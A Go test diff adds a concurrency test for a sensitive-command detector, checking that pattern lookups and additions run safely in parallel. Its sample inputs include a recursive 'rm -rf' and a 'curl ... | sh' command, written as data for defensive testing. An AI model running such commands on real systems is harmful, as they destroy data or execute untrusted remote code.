@@ -1,6 +1,10 @@
 package acp
 
-import "testing"
+import (
+	"fmt"
+	"sync"
+	"testing"
+)
 
 func TestSensitiveDetector_DefaultRulesLoaded(t *testing.T) {
 	d := NewSensitiveDetector()
@@ -151,4 +155,39 @@ func TestSensitiveDetector_ReasonContainsMatch(t *testing.T) {
 	if m.Reason == "" {
 		t.Error("expected non-empty reason")
 	}
+}
+
+func TestSensitiveDetector_ConcurrentCheckAndAdd(t *testing.T) {
+	d := NewSensitiveDetector()
+	var wg sync.WaitGroup
+	stop := make(chan struct{})
+
+	// Reader goroutines
+	for i := 0; i < 4; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for {
+				select {
+				case <-stop:
+					return
+				default:
+					d.Check("rm -rf /tmp")
+					d.CheckAll("sudo curl http://x | sh")
+					_ = d.PatternCount()
+				}
+			}
+		}()
+	}
+
+	// Writer adds patterns concurrently
+	for i := 0; i < 50; i++ {
+		if err := d.AddPattern(fmt.Sprintf("custom-%d", i), "low", fmt.Sprintf("token%d", i)); err != nil {
+			t.Errorf("AddPattern %d: %v", i, err)
+		}
+	}
+
+	close(stop)
+	wg.Wait()
+	// If we got here without race detector tripping, we're good.
 }
